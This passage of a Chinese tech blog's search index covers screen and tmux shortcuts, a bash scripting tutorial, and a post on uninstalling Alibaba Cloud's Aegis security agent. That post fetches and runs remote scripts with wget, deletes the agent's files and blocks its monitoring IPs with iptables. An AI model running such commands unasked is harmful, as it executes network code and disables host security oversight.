# 进入拷贝/回滚模式Ctrl+a,]   # 粘贴screen剪贴板中的内容Ctrl+a,x   # 锁住当前的 window, 需用用户密码解锁1. 忘记screen会话密码;要么想起来密码，要么kill掉该会话吧；2. 想换screen会话密码;按下 Ctrl-a 然后再输入 :password 命令，连续输入2次新密码,重新进入即可Ctrl+a,s  # 锁定会话。锁定以后，再进行任何输入屏幕都不会再有反应了。但是要注意虽然屏幕上看不到反应，但你的输入都会被Screen中的进程接收到。Ctrl+a,q可以解锁一个会话。Ctrl+a,A    #为当前窗口重命名Ctrl+a,C    #Clear the screen.Ctrl+a,S    # 水平分割窗口(分为上下两块).Ctrl+a,|    # 竖直分割窗口(分为左右两块)# 新分割出的块跳转过来后需要用Ctrl+a,c来创建新shell.    Ctrl+a,&lt;Tab&gt;   # 在分割的各块中跳转.     Ctrl+a,X       # 关闭分割的块.C-a t # Time，显示当前时间，和系统的 load 复制模式C-a [ : 进入 copy mode，在 copy mode 下可以回滚、搜索、复制就像用使用 vim 一样    C-b   : Backward，PageUp     C-f   : Forward，PageDown     H     : (大写) High，将光标移至左上角     L     : Low，将光标移至左下角     0     : 移到行首     $     : 行末     w     : forward one word，以字为单位往前移     b     : backward one word，以字为单位往后移     Space : 第一次按为标记区起点，第二次按为终点 (类似于vim的v选择)    Esc   : 结束 copy mode C-a ] : Paste，把刚刚在 copy mode 选定的内容贴上</code></pre><blockquote><p>窗格操作</p></blockquote><pre><code>CTRL+a,|  # 纵向分割CTRL+a,S  #  横向分割CTRL+a，c，#，分割后要，创建新的窗口才能使用CTRL+a,TAB  # 切换窗格Ctrl+a,X  #关闭当前焦点所在的屏幕区块Ctrl+a,Q  #关闭除当前区块之外其他的所有区块</code></pre><blockquote><p>会话共享</p></blockquote><pre><code>screen -x name/id  # 创建一个screen会话，另一个终端上输入启用共享，不同用户在当前screen会话窗口按Ctrl + a ,输入冒号：，在冒号后输入multiuser on,回车，就打开了多用户共享开关授权授权用户B能够连接A共享的会话：在当前screen会话窗口按Ctrl + a ,输入冒号：，在冒号后输入acladd B,回车即可</code></pre><blockquote><p>脚本</p></blockquote><pre><code>向screen中正在运行的程序发送按键消息比如screen中正在运行程序top，此时我想从另一个终端中向此screen中的top程序发送终止命令q# 新建一个名为top的screen并在其中运行top命令[root@localhost ~]# screen -S top[root@localhost ~]# top# 在另一个终端中运行下列指令，然后发现上述top进程终止了[root@localhost ~]# screen -S top -X stuff &quot;q&quot;# or[root@localhost ~]# screen -S top -X stuff &quot;^C&quot;# 当然也可以发送回车键[root@localhost ~]# screen -S top -X stuff &quot;^M&quot;在screen中启动程序比如，我想在脚本中在某个screen中启动top进程# 一定要带$，一定要使用单引号[root@localhost ~]# screen -S top -X stuff $&#39;top\n&#39;# or[root@localhost ~]# screen -S top -X stuff &quot;top^M&quot;如果我们直接在脚本里写 screen -S my_screen, 会导致脚本无法继续执行。为了使脚本执行下去，创建screen的具体代码如下：screen_name=$&quot;my_screen&quot;screen -dmS $screen_name现在，我们就已经创建了一个名为 my_screen 的窗口。然后，我们需要向其发送具体的命令。我们用如下命令：cmd=$&quot;java Test&quot;;screen -x -S $screen_name -p 0 -X stuff &quot;$cmd&quot;screen -x -S $screen_name -p 0 -X stuff $&#39;\n&#39;6.3 发送命令到screen会话在Screen会话之外，可以通过screen命令操作一个Screen会话，这也为使用Screen作为脚本程序增加了便利。关于Screen在脚本中的应用超出了入门的范围，这里只看一个例子，体会一下在会话之外对Screen的操作：[root@TS-DEV ~]# screen -S sandy -X screen ping www.baidu.com这个命令在一个叫做sandy的screen会话中创建一个新窗口，并在其中运行ping命令。</code></pre>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
          <category> cmd </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>linux tmux.md</title>
      <link href="/2019/12/03/deploy/linux/cmd/linux%20tmux/"/>
      <url>/2019/12/03/deploy/linux/cmd/linux%20tmux/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/kaiye/p/6275207.html" target="_blank" rel="noopener">https://www.cnblogs.com/kaiye/p/6275207.html</a></p><p><a href="http://louiszhai.github.io/2017/09/30/tmux/" target="_blank" rel="noopener">http://louiszhai.github.io/2017/09/30/tmux/</a></p><blockquote><p>会话操作</p></blockquote><pre><code>tmux [new -s 会话名 -n 窗口名]  #启动新会话tmux at [-t 会话名]  #恢复会话tmux ls  #列出所有会话tmux kill-session -t 会话名  #关闭会话tmux ls | grep : | cut -d. -f1 | awk &#39;{print substr($1, 0, length($1  #关闭所有会话</code></pre><p>进入tmux后</p><blockquote><p>会话操作</p></blockquote><pre><code>ctrl+b,:new&lt;回车&gt;  # 启动新会话ctrl+b,s    # 列出所有会话ctrl+b,$    # 重命名当前会话ctrl+b,d   #退出 tmux（tmux 仍在后台运行）ctrl+b,t   #窗口中央显示一个数字时钟ctrl+b,?   #列出所有快捷键ctrl+b,:   #命令提示符</code></pre><blockquote><p>窗口操作</p></blockquote><pre><code>ctrl+b,c  创建新窗口ctrl+b,w  列出所有窗口ctrl+b,n  后一个窗口ctrl+b,p  前一个窗口ctrl+b,f  查找窗口ctrl+b,,  重命名当前窗口ctrl+b,&amp;  关闭当前窗口# 调整窗口排序:swap-window -s 3 -t 1  #交换3号和1 号窗口:swap-window -t 1   #交换当前和 1 号窗口:move-window -t 1   #移动当前窗口到 1 号# 同步窗格:setw synchronize-panes  </code></pre><blockquote><p>窗格操作</p></blockquote><pre><code># 分割窗口ctrl+b,%  #  垂直分割ctrl+b,&quot;  #  水平分割ctrl+b,o  #  交换窗格ctrl+b,x  #  关闭窗格ctrl+b,⍽  #  左边这个符号代表空格键 - 切换布局ctrl+b,q  # 显示每个窗格是第几个，当数字出现的时候按数字几就选中第几个窗格ctrl+b,{  # 与上一个窗格交换位置ctrl+b,}  # 与下一个窗格交换位置ctrl+b,z  # 切换窗格最大化/最小化# 同步窗格:setw synchronize-panes# 调整窗格尺寸，PREFIX == ctrl+bPREFIX : resize-pane -D          #当前窗格向下扩大 1 格PREFIX : resize-pane -U          #当前窗格向上扩大 1 格PREFIX : resize-pane -L          #当前窗格向左扩大 1 格PREFIX : resize-pane -R          #当前窗格向右扩大 1 格PREFIX : resize-pane -D 20       #当前窗格向下扩大 20 格PREFIX : resize-pane -t 2 -L 20  #编号为 2 的窗格向左扩大 20 格</code></pre><blockquote><p>文本复制模式</p></blockquote><pre><code>PREFIX-[  #进入文本复制模式PREFIX-]  #粘贴文本按下 PREFIX-[ 进入文本复制模式。可以使用方向键在屏幕中移动光标。默认情况下，方向键是启用的。在配置文件中启用 Vim 键盘布局来切换窗口、调整窗格大小。Tmux 也支持 Vi 模式。要是想启用 Vi 模式，只需要把下面这一行添加到 .tmux.conf 中：setw -g mode-keys vi启用这条配置后，就可以使用 h、j、k、l 来移动光标了。想要退出文本复制模式的话，按下回车键就可以了。然后按下 PREFIX-] 粘贴刚才复制的文本。一次移动一格效率低下，在 Vi 模式启用的情况下，可以辅助一些别的快捷键高效工作。例如，可以使用 w 键逐词移动，使用 b 键逐词回退。使用 f 键加上任意字符跳转到当前行第一次出现该字符的位置，使用 F 键达到相反的效果。vi             emacs        功能^              M-m          反缩进Escape         C-g          清除选定内容Enter          M-w          复制选定内容j              Down         光标下移h              Left         光标左移l              Right        光标右移L                           光标移到尾行M              M-r          光标移到中间行H              M-R          光标移到首行k              Up           光标上移d              C-u          删除整行D              C-k          删除到行末$              C-e          移到行尾:              g            前往指定行C-d            M-Down       向下滚动半屏C-u            M-Up         向上滚动半屏C-f            Page down    下一页w              M-f          下一个词p              C-y          粘贴C-b            Page up      上一页b              M-b          上一个词q              Escape       退出C-Down or J    C-Down       向下翻C-Up or K      C-Up         向下翻n              n            继续搜索?              C-r          向前搜索/              C-s          向后搜索0              C-a          移到行首Space          C-Space      开始选中               C-t          字符调序</code></pre>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
          <category> cmd </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>linux shell.md</title>
      <link href="/2019/12/03/deploy/linux/linux%20shell/"/>
      <url>/2019/12/03/deploy/linux/linux%20shell/</url>
      
        <content type="html"><![CDATA[<p>教程</p><h1 id="shell编程"><a href="#shell编程" class="headerlink" title="shell编程"></a>shell编程</h1><blockquote><p>bash程序由以下三部分组成：<br>以“#！”开头指定的解释器，以“#”开头的注释行，其他的都是可执行语句，即程序体。</p></blockquote><pre><code class="bash">#!/bin/bash</code></pre><h1 id="一、shell编程之变量"><a href="#一、shell编程之变量" class="headerlink" title="一、shell编程之变量"></a>一、shell编程之变量</h1><h2 id="bash变量命名规则"><a href="#bash变量命名规则" class="headerlink" title="bash变量命名规则"></a>bash变量命名规则</h2><ul><li>只能包含字母、数字和下划线，并且不能以数字开头；</li><li>不应该跟系统中已有的环境变量重名；</li><li>最好能见名知意</li></ul><h2 id="1-用户自定义变量"><a href="#1-用户自定义变量" class="headerlink" title="1.用户自定义变量"></a>1.用户自定义变量</h2><blockquote><p>shell中的变量值都是字符型的，要进行算数运算要通过另外的方式，在后面介绍  </p></blockquote><h3 id="定义变量"><a href="#定义变量" class="headerlink" title="定义变量"></a>定义变量</h3><blockquote><p>格式：变量名=变量值 </p></blockquote><p>举例：</p><pre><code class="shell">x=5  name=&quot;zhu&quot;</code></pre><h3 id="变量调用："><a href="#变量调用：" class="headerlink" title="变量调用："></a>变量调用：</h3><blockquote><p>echo ${变量名}(推荐)或者echo $变量名  </p></blockquote><p>举例：</p><pre><code>echo ${x}或者$xecho ${name}或者$name</code></pre><h2 id="2-bash环境变量"><a href="#2-bash环境变量" class="headerlink" title="2.bash环境变量"></a>2.bash环境变量</h2><blockquote><p>与用户自定义变量区别：<br>用户自定义变量：<br>是局部变量，只在当前的Shell中生效<br>环境变量：<br>是全局变量，在在当前Shell和这个Shell的所有子Shell中生效<br>对系统生效的环境变量名和变量作用是固定的</p></blockquote><h3 id="设置环境变量"><a href="#设置环境变量" class="headerlink" title="设置环境变量"></a>设置环境变量</h3><blockquote><p>export 变量名=变量值<br>或<br>变量名=变量值<br>export 变量名</p></blockquote><h3 id="查看环境变量"><a href="#查看环境变量" class="headerlink" title="查看环境变量"></a>查看环境变量</h3><ul><li>set :查看所有变量</li><li>env :查看环境变量</li></ul><h3 id="删除环境变量"><a href="#删除环境变量" class="headerlink" title="删除环境变量"></a>删除环境变量</h3><ul><li>unset 变量名</li></ul><h3 id="常用环境变量"><a href="#常用环境变量" class="headerlink" title="常用环境变量"></a>常用环境变量</h3><ul><li>HOSTNAME :主机名</li><li>SHELL :当前的shell</li><li>TERM :终端环境</li><li>HISTSIZE :历史命令条数</li><li>SSH_CLIENT :当前操作环境是用ssh连接的，这里记录客户端ip</li><li>SSH_TTY :ssh连接的终端时pts/1</li><li>USER :当前登录的用户</li></ul><h3 id="PATH环境变量"><a href="#PATH环境变量" class="headerlink" title="PATH环境变量"></a>PATH环境变量</h3><blockquote><p>PATH变量：系统查找命令的路径</p></blockquote><pre><code class="shell">echo $PATH #查看PATH环境变量PATH=&quot;$PATH&quot;:/root/sh #增加PATH变量的值</code></pre><h2 id="3-bash语系变量"><a href="#3-bash语系变量" class="headerlink" title="3.bash语系变量"></a>3.bash语系变量</h2><blockquote><p>locale : 查询当前系统语系  </p><ul><li>LANG :定义系统主语系的变量</li><li>LC_ALL :定义整体语系的变量</li></ul></blockquote><pre><code class="shell">    echo $LANG #查看系统当前语系    locale -a | more #查看Linux支持的所有语系</code></pre><h3 id="查询系统默认语系"><a href="#查询系统默认语系" class="headerlink" title="查询系统默认语系"></a>查询系统默认语系</h3><blockquote><p>使用以下命令查看配置文件</p></blockquote><pre><code class="shell">cat /etc/sysconfig/i18n</code></pre><h2 id="4-位置参数变量"><a href="#4-位置参数变量" class="headerlink" title="4.位置参数变量"></a>4.位置参数变量</h2><h3 id="位置参数变量"><a href="#位置参数变量" class="headerlink" title="位置参数变量"></a>位置参数变量</h3><table><thead><tr><th align="left">位置参数变量</th><th align="left">作用</th></tr></thead><tbody><tr><td align="left">$n</td><td align="left">n为数字，$0代表命令本身，一到九参数：$1-$9，十以上： ${10}</td></tr><tr><td align="left">$*</td><td align="left">代表命令行中所有的参数，$*吧所有的参数看成一个整体</td></tr><tr><td align="left">$@</td><td align="left">这个变量也代表命令行中所有的参数，不过$@吧每个参数区分对待</td></tr><tr><td align="left">$#</td><td align="left">这个变量代表命令行中所有参数的个数</td></tr></tbody></table><p>举例:新建一个文件名为 a.sh,将以下程序写入文件  </p><pre><code class="shell">#!/bin/bashnum1=$1num2=$2sum=$(( $num1 + $num2 )) #变量sum的和是num1加num2echo $sum #打印变量sum的值</code></pre><blockquote><p>编辑完成，退出后对文件赋予执行权限  </p></blockquote><pre><code class="shell">    chmod 755 a.sh      ./a.sh 1 2  #执行</code></pre><h2 id="5-预定义变量"><a href="#5-预定义变量" class="headerlink" title="5.预定义变量"></a>5.预定义变量</h2><table><thead><tr><th align="left">预定义变量</th><th align="left">作用</th></tr></thead><tbody><tr><td align="left">$?</td><td align="left">最后一次执行的命令的返回状态，若为0，上一个命令正确执行，非0，则执行不正确</td></tr><tr><td align="left">$$</td><td align="left">当前进程的进程号</td></tr><tr><td align="left">$!</td><td align="left">后台运行的最后一个进程的进程号</td></tr></tbody></table><h3 id="接受键盘输入"><a href="#接受键盘输入" class="headerlink" title="接受键盘输入"></a>接受键盘输入</h3><pre><code>read [选项] [变量名]*  选项:*  -p &quot;提示信息&quot;: 在等待read输入时， 输出提示信息* -t 秒数:read命令会一直等待用户输入，使用此选项可指定等待时间* -n 字符数:read命令值接受指定的字符数，就会执行* -s :隐藏输入的数据，适用于机密信息的输入</code></pre><p>举例:</p><pre><code class="shell">#!/bin/bashread -p &quot;please input your name: &quot; nameecho -e &quot;\n&quot;  #使用 -e 选项就能使echo识别&quot;\n&quot;echo $name</code></pre><h1 id="二、shell编程之数值运算"><a href="#二、shell编程之数值运算" class="headerlink" title="二、shell编程之数值运算"></a>二、shell编程之数值运算</h1><h2 id="declare命令"><a href="#declare命令" class="headerlink" title="declare命令"></a>declare命令</h2><p>declare 声明变量类型</p><pre><code>declare [+/-] [选项] 变量名* 选项* -: 给变量设定类型属性* +: 取消变量的类型属性* -a: 将变量声明为数组型* -i: 将变量声明为整数型（integer）* -x: 将变量声明为环境变量* -r: 将变量声明为只读变量* -p: 显示指定变量的被声明的类型</code></pre><h3 id="把变量声明为数值型"><a href="#把变量声明为数值型" class="headerlink" title="把变量声明为数值型"></a>把变量声明为数值型</h3><p>举例:</p><pre><code class="shell">aa=11bb=22echo $aa+$bbdeclare -i cc=$aa+$bbecho $cc</code></pre><h3 id="声明数组变量"><a href="#声明数组变量" class="headerlink" title="声明数组变量"></a>声明数组变量</h3><p>举例:</p><pre><code class="shell">#定义数组movie[0]=aamovie[1]=bbdeclare -a movie[2]=live#查看数组echo ${movie}echo ${movie[2]}echo ${movie[*]}</code></pre><h3 id="声明环境变量"><a href="#声明环境变量" class="headerlink" title="声明环境变量"></a>声明环境变量</h3><blockquote><p>declare -x test=123 #和export作用相似，但其实是declare命令的作用<br>set #查看环境变量</p></blockquote><h2 id="数值运算方法"><a href="#数值运算方法" class="headerlink" title="数值运算方法"></a>数值运算方法</h2><blockquote><p>数值运算方法1:使用declare定义</p></blockquote><blockquote><p>数值运算方法2:使用 expr或let数值运算工具</p></blockquote><p>举例:</p><pre><code class="shell">aa=1bb=22dd=$(expr $aa + $bb) #&quot;+&quot;号左右两侧必须有空格echo $dd</code></pre><blockquote><p>数值运算方法3:”$((运算式))”（推荐）或者”$[运算式]”</p></blockquote><p>举例：</p><pre><code class="shell">aa=1bb=3cc=$(( $aa+$bb ))dd=$[ $aa+$bb ]echo $ccecho $dd</code></pre><h2 id="变量测试-了解"><a href="#变量测试-了解" class="headerlink" title="变量测试(了解)"></a>变量测试(了解)</h2><blockquote><p>变量测试在脚本优化时使用，一般使用者，只要了解即可</p></blockquote><table><thead><tr><th align="left">变量置换方式</th><th align="left">变量y没有设置</th><th align="left">变量y为空</th><th align="left">变量y设置值</th></tr></thead><tbody><tr><td align="left">x=${y-新值}</td><td align="left">x=新值</td><td align="left">x为空</td><td align="left">x=$y</td></tr><tr><td align="left">x=${y:-新值}</td><td align="left">x=新值</td><td align="left">x=新值</td><td align="left">x=$y</td></tr><tr><td align="left">x=${y+新值}</td><td align="left">x为空</td><td align="left">x=新值</td><td align="left">x=新值</td></tr><tr><td align="left">x=${y:+新值}</td><td align="left">x为空</td><td align="left">x为空</td><td align="left">x=新值</td></tr><tr><td align="left">x=${y=新值}</td><td align="left">x=新值 y=新值</td><td align="left">x为空 y值不变</td><td align="left">x=$y y值不变</td></tr><tr><td align="left">x=${y:=新值}</td><td align="left">x=新值 y=新值</td><td align="left">x=新值 y=新值</td><td align="left">x=$y y值不变</td></tr><tr><td align="left">x=${y?新值}</td><td align="left">新值输出到标准错误输出</td><td align="left">x=为空</td><td align="left">x=$y</td></tr><tr><td align="left">x=${y:?新值}</td><td align="left">新值输出到标准错误输出</td><td align="left">新值输出到标准错误输出</td><td align="left">x=$y</td></tr></tbody></table><h1 id="三、shell编程之条件判断和流程控制"><a href="#三、shell编程之条件判断和流程控制" class="headerlink" title="三、shell编程之条件判断和流程控制"></a>三、shell编程之条件判断和流程控制</h1><h2 id="1-条件判断式语句"><a href="#1-条件判断式语句" class="headerlink" title="1.条件判断式语句"></a>1.条件判断式语句</h2><blockquote><p>两种判断格式<br>test -e /root/install.log<br>[ -e /root/install.log ]</p></blockquote><p>举例：按照</p><pre><code>[ -e /root/install.log ] &amp;&amp; echo yes || echo no#第一个判断命令如果正确执行，则打印“yes”，否则打印“no”</code></pre><h3 id="按照文件类型进行判断"><a href="#按照文件类型进行判断" class="headerlink" title="按照文件类型进行判断"></a>按照文件类型进行判断</h3><table><thead><tr><th align="left">测试选项</th><th align="left">作用</th></tr></thead><tbody><tr><td align="left">-b 文件</td><td align="left">判断给文件是否存在，并且是否为块设备文件，是为真</td></tr><tr><td align="left">-c 文件</td><td align="left">判断给文件是否存在，并且是否为字符设备文件，是为真</td></tr><tr><td align="left">-d 文件</td><td align="left">判断给文件是否存在，并且是否为目录文件，是为真</td></tr><tr><td align="left">-e 文件</td><td align="left">判断给文件是否存在，是为真</td></tr><tr><td align="left">-f 文件</td><td align="left">判断给文件是否存在，并且是否为普通文件，是为真</td></tr><tr><td align="left">-L 文件</td><td align="left">判断给文件是否存在，并且是否为符号链接文件，是为真</td></tr><tr><td align="left">-p 文件</td><td align="left">判断给文件是否存在，并且是否为管道文件，是为真</td></tr><tr><td align="left">-s 文件</td><td align="left">判断给文件是否存在，并且是否为非空，非空为真</td></tr><tr><td align="left">-S 文件</td><td align="left">判断给文件是否存在，并且是否为套接字文件，是为真</td></tr></tbody></table><h3 id="按照文件权限进行判断"><a href="#按照文件权限进行判断" class="headerlink" title="按照文件权限进行判断"></a>按照文件权限进行判断</h3><table><thead><tr><th>测试选项</th><th>作用</th></tr></thead><tbody><tr><td>-r 文件</td><td>判断给文件是否存在，并且是否拥有读权限,有为真</td></tr><tr><td>-w 文件</td><td>判断给文件是否存在，并且是否拥有写权限,有为真</td></tr><tr><td>-x 文件</td><td>判断给文件是否存在，并且是否拥有执行权限,有为真</td></tr><tr><td>-u 文件</td><td>判断给文件是否存在，并且是否拥有SUID权限,有为真</td></tr><tr><td>-g 文件</td><td>判断给文件是否存在，并且是否拥有SGID权限,有为真</td></tr><tr><td>-k 文件</td><td>判断给文件是否存在，并且是否拥有SBit权限,有为真</td></tr></tbody></table><h3 id="两个文件之间进行比较"><a href="#两个文件之间进行比较" class="headerlink" title="两个文件之间进行比较"></a>两个文件之间进行比较</h3><table><thead><tr><th>测试选项</th><th>作用</th></tr></thead><tbody><tr><td>文件1 -nt 文件2</td><td>判断文件1的修改时间是否比文件2的新(如果新则为真)</td></tr><tr><td>文件1 -ot 文件2</td><td>判断文件1的修改时间是否比文件2的旧(如果旧则为真)</td></tr><tr><td>文件1 -ef 文件2</td><td>判断文件1是否和文件2的lnode号一致，可以理解为是否为同一文件，可用于判断硬链接</td></tr></tbody></table><h3 id="两个整数之间比较"><a href="#两个整数之间比较" class="headerlink" title="两个整数之间比较"></a>两个整数之间比较</h3><table><thead><tr><th>测试选项</th><th>作用</th></tr></thead><tbody><tr><td>整数1 -eq 整数2</td><td>判断整数1是否和整数2相等(相等为真)</td></tr><tr><td>整数1 -ne 整数2</td><td>判断整数1是否和整数2不相等(不相等为真)</td></tr><tr><td>整数1 -gt 整数2</td><td>判断整数1是否大于整数2(大于为真)</td></tr><tr><td>整数1 -lt 整数2</td><td>判断整数1是否小于整数2(小于为真)</td></tr><tr><td>整数1 -ge 整数2</td><td>判断整数1是否大于等于数2(大于等于为真)</td></tr><tr><td>整数1 -le 整数2</td><td>判断整数1是否小于等于整数2(小于等于为真)</td></tr></tbody></table><h3 id="字符串的判断"><a href="#字符串的判断" class="headerlink" title="字符串的判断"></a>字符串的判断</h3><table><thead><tr><th>测试选项</th><th>作用</th></tr></thead><tbody><tr><td>-z 字符串</td><td>判断字符串是否为空(为空返回真)</td></tr><tr><td>-n 字符串</td><td>判断字符串是否为非空(非空返回真)</td></tr><tr><td>字串1 == 字串2</td><td>判断字符串1是否和字符串2相等(相等返回真)</td></tr><tr><td>字串1 != 字串2</td><td>判断字符串1是否和字符串2不相等(不相等返回真)</td></tr></tbody></table><h3 id="多重条件判断"><a href="#多重条件判断" class="headerlink" title="多重条件判断"></a>多重条件判断</h3><table><thead><tr><th>测试选项</th><th>作用</th></tr></thead><tbody><tr><td>判断1 -a 判断2</td><td>逻辑与，都成立为真</td></tr><tr><td>判断1 -o 判断2</td><td>逻辑或，有一个成立就为真</td></tr><tr><td>!判断</td><td>逻辑非，取反</td></tr></tbody></table><h2 id="2-条件判断if语句"><a href="#2-条件判断if语句" class="headerlink" title="2.条件判断if语句"></a>2.条件判断if语句</h2><h3 id="单分支if语句"><a href="#单分支if语句" class="headerlink" title="单分支if语句"></a>单分支if语句</h3><blockquote><p>格式<br>if [ 条件判断式 ];then<br>　程序<br>fi<br>或者<br>if [条件判断式 ]<br>　then<br>fi<br>[ 条件判断式 ]就是使用test命令判断，所以中括号和太监判断式之间必须有空格</p></blockquote><h3 id="双分支if语句"><a href="#双分支if语句" class="headerlink" title="双分支if语句"></a>双分支if语句</h3><blockquote><p>格式<br>if [ 条件判断式 ]<br>　then<br>　　条件成立时，执行程序<br>　else<br>　　条件不成立时，执行的另一个程序<br>fi  </p></blockquote><h3 id="多分支if语句"><a href="#多分支if语句" class="headerlink" title="多分支if语句"></a>多分支if语句</h3><blockquote><p>格式<br>if [ 条件判断式 ]<br>　then<br>　　当条件判断式1成立时，执行程序1<br>elif<br>　then<br>　　当条件判断式2成立时，执行程序2<br>…省略更多条件…<br>else<br>　　当所有条件都不成立时，最后执行此程序<br>fi  </p></blockquote><h2 id="3-多分支case语句"><a href="#3-多分支case语句" class="headerlink" title="3. 多分支case语句"></a>3. 多分支case语句</h2><blockquote><p>格式<br>case $变量名 in<br>　“”)<br>　　如果变量的值等于1，则执行程序1<br>　　;;<br>　“”)<br>　　如果变量的值等于1，则执行程序1<br>　　;;<br>　…省略其他分支…<br>　*)<br>　　如果变量的值都不是以上的值，则执行此程序<br>　　;;<br>esac  </p></blockquote><h2 id="4-for循环"><a href="#4-for循环" class="headerlink" title="4. for循环"></a>4. for循环</h2><h3 id="语法一"><a href="#语法一" class="headerlink" title="语法一"></a>语法一</h3><blockquote><p>格式<br>for 变量 in 值1 值2 值3…<br>　do<br>　　程序<br>　done  </p></blockquote><p>举例1:</p><pre><code class="shell">#!/bin/bashfor i in 1 2 3 4 5    do        echo $i    done</code></pre><p>举例2:</p><pre><code class="shell">#!/bin/bash#列出当前目录下的文件for i in ls    do        echo $i    done</code></pre><h3 id="语法二"><a href="#语法二" class="headerlink" title="语法二"></a>语法二</h3><blockquote><p>格式<br>for (( 初始值;循环控制条件;变量变化 ))<br>　do<br>　　程序<br>　done  </p></blockquote><p>举例:</p><pre><code class="shell">#!/bin/bash#从1加到100s=0for(( i=1;i&lt;=100;i=i+1 ))    do        s=$(( $s+$i ))    doneecho &quot;The sum of 1+2+...+100 is : $s&quot;</code></pre><h2 id="5-while循环和until循环"><a href="#5-while循环和until循环" class="headerlink" title="5. while循环和until循环"></a>5. while循环和until循环</h2><blockquote><p>while格式<br>while [ 条件判断式 ]<br>　do<br>　　程序<br>　done  </p></blockquote><p>举例：</p><pre><code class="shell">#!/bin/bash#从1加到100i=1s=0while [ %i -le 100 ]#如果变量i的值小于等于100，则执行循环    do        s=$(( $s+$i ))        i=$(( $i+1 ))    doneecho &quot;The sum is: $s&quot;</code></pre><blockquote><p>until格式<br>until [ 条件判断式 ]<br>　do<br>　　程序<br>　done  </p></blockquote><p>举例:</p><pre><code class="shell">#!/bin/bash#从1加到100i=1s=0until [ $i -gt 100 ]#循环知道变量i的值大于100，就停止循环    do        s=$(( $s+$i ))        i=$(( $i+1 ))    doneecho &quot;Teh sum is: $s&quot;</code></pre><h2 id="6-break命令"><a href="#6-break命令" class="headerlink" title="6.break命令"></a>6.break命令</h2><blockquote><p>break命令允许跳出所有循环（终止执行后面的所有循环）</p></blockquote><p>举例:</p><pre><code class="shell">#!/bin/bashwhile :do    echo -n &quot;输入 1 到 5 之间的数字:&quot;    read aNum    case $aNum in        1|2|3|4|5) echo &quot;你输入的数字为 $aNum!&quot;        ;;        *) echo &quot;你输入的数字不是 1 到 5 之间的! 游戏结束&quot;            break        ;;    esacdone</code></pre><p>执行以上代码，输出结果为：</p><blockquote><p>输入 1 到 5 之间的数字:3<br>你输入的数字为 3!<br>输入 1 到 5 之间的数字:7<br>你输入的数字不是 1 到 5 之间的! 游戏结束  </p></blockquote><h2 id="7-continue命令"><a href="#7-continue命令" class="headerlink" title="7.continue命令"></a>7.continue命令</h2><blockquote><p>continue命令与break命令类似，只有一点差别，它不会跳出所有循环，仅仅跳出当前循环</p></blockquote><p>举例:</p><pre><code class="shell">#!/bin/bashwhile :do    echo -n &quot;输入 1 到 5 之间的数字:&quot;    read aNum    case $aNum in        1|2|3|4|5) echo &quot;你输入的数字为 $aNum!&quot;        ;;        *) echo &quot;你输入的数字不是 1 到 5 之间的!&quot;            continue            echo &quot;游戏结束&quot;        ;;    esacdone</code></pre><blockquote><p>运行代码发现，当输入大于5的数字时，该例中的循环不会结束，语句 echo “Game is over!” 永远不会被执行。</p></blockquote><h1 id="四、shell程序调试"><a href="#四、shell程序调试" class="headerlink" title="四、shell程序调试"></a>四、shell程序调试</h1><blockquote><p>Bash常用的调试方法是带-x执行程序，这样会把执行到的语句全部显示出来。  </p></blockquote><p>格式：</p><blockquote><p>bash -x file.sh</p></blockquote><p>举例:</p><pre><code>...set -v#需要调试的语句set +v...</code></pre><blockquote><p>如果bash程序很长，可在需要调试的程序块前后标记调试标记—块前插入语句set –v，块后插入语句set+v即可，这样调试时只打印调试块中的执行路径。建议bash程序的语句最好不要超过1000行。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>linux 卸载阿里云云盾.md</title>
      <link href="/2019/12/03/deploy/linux/linux%20%E5%8D%B8%E8%BD%BD%E9%98%BF%E9%87%8C%E4%BA%91%E4%BA%91%E7%9B%BE/"/>
      <url>/2019/12/03/deploy/linux/linux%20%E5%8D%B8%E8%BD%BD%E9%98%BF%E9%87%8C%E4%BA%91%E4%BA%91%E7%9B%BE/</url>
      
        <content type="html"><![CDATA[<p>1、卸载阿里云盾（安骑士）</p><p>卸载方法很简单，执行下面三段命令即可：</p><pre><code class="shell">wget http://update.aegis.aliyun.com/download/uninstall.shchmod +x uninstall.sh./uninstall.shwget http://update.aegis.aliyun.com/download/quartz_uninstall.shchmod +x quartz_uninstall.sh./quartz_uninstall.sh</code></pre><p>删除残留：</p><pre><code class="shell">pkill aliyun-servicerm -fr /etc/init.d/agentwatch /usr/sbin/aliyun-servicerm -rf /usr/local/aegis*</code></pre><p>2、屏蔽云盾IP</p><p>执行下面命令通过“iptables”防火墙来屏蔽云盾IP：</p><pre><code class="shell">iptables -I INPUT -s 140.205.201.0/28 -j DROPiptables -I INPUT -s 140.205.201.16/29 -j DROPiptables -I INPUT -s 140.205.201.32/28 -j DROPiptables -I INPUT -s 140.205.225.192/29 -j DROPiptables -I INPUT -s 140.205.225.200/30 -j DROPiptables -I INPUT -s 140.205.225.184/29 -j DROPiptables -I INPUT -s 140.205.225.183/32 -j DROPiptables -I INPUT -s 140.205.225.206/32 -j DROPiptables -I INPUT -s 140.205.225.205/32 -j DROPiptables -I INPUT -s 140.205.225.195/32 -j DROPiptables -I INPUT -s 140.205.225.204/32 -j DROP</code></pre><p><a href="https://blog.csdn.net/qjc_501165091/article/details/51225984" target="_blank" rel="noopener">https://blog.csdn.net/qjc_501165091/article/details/51225984</a></p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>linux chmod.md</title>
      <link href="/2019/12/03/deploy/linux/cmd/linux%20chmod/"/>
      <url>/2019/12/03/deploy/linux/cmd/linux%20chmod/</url>
      
